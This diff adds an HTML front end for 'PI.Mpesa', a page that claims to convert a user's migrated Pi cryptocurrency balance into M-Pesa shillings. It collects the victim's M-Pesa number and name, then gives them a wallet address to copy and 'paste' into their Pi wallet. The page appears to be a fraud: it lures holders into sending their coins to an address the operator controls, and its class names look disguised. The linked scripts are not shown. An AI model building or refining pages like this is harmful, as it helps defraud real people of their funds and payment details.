@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PI.Mpesa</title>
+  <link rel="stylesheet" a href="styles/final.css">
+</head>
+<body>
+  <header class="top-header">
+    <img class="pi-icon" src="icons/pi-96.png">
+    <span class="msg-header">
+      PI.Mpesa
+    </span>
+  </header>
+
+   <div class="rules-box">
+     <ul>
+      <div class="d1v">
+        <span>Confirm that you want </span>
+        <span class="balance">
+        
+        </span>
+      <span>Ksh to be transfered to your mpesa</span>
+      </div>
+      <li class="pts">Enter your mpesa bank account on the box below </li>
+      <li class="pts">Confirm that the amount you want to convert is almost or equivalent  to your migrated balance on Pi</li>
+      <li class="pts">Copy the address you're given    (Do not share this address with anyone) </li>
+     </ul>
+   </div>
+
+   <div class="user-details-box">
+    <span class="pp">Link your mpesa account</span>
+     <input type="number" placeholder="07 / 01,," class="number-b1x">
+     <input type="text" placeholder="Enter Mpesa Name" class="name-b1x">   <div class="save-b1x">
+      </div>
+
+      
+        <div class="wrapper">
+          <article class="flow">
+            <button id="hoverPopover" class="save"
+              onclick="saveDetails();">
+              Create wallet
+              <img src="icons/mpesa-60 (1).png" alt="">
+            </button>
+          </article>
+        </div>
+      
+        <!--
+      <div popover id="my-popover" class="box">
+        <h2>Your wallet was succesfuly linked .
+          Now copy the new wallet adress given below and go to your main Pi wallet</h2>
+      </div>
+    -->
+       <div class="water-glass">
+      <h1 class="descc"> </h1>
+      <h1 class="desccc"> </h1>
+      <div class="top-b1x">
+        <div class="l1nkk">
+          <span class="l1nk" id="copyText">finish setting up your mpesa account..👆</span>
+        </div>
+        <button class="copy-btn"
+         onclick="copyText()">
+          <img class="gif" src="icons/copy.gif">
+          <div class="tooltip">Copied! Go back to you Pi and paste this adress</div>
+        </button>
+      </div>
+
+      <img 
+        src="icons/qr.png"
+        class="qr"
+      />
+
+
+      <div class="last-b1x">
+        <a class="back" href="home.html">Back to prev page</a>
+      </div>
+    </div>
+  
+   </div>
+  
+</body>
+<script src="scripts/final.js">
+</script>
+<script src="scripts/home.js">
+</script>
+</html>
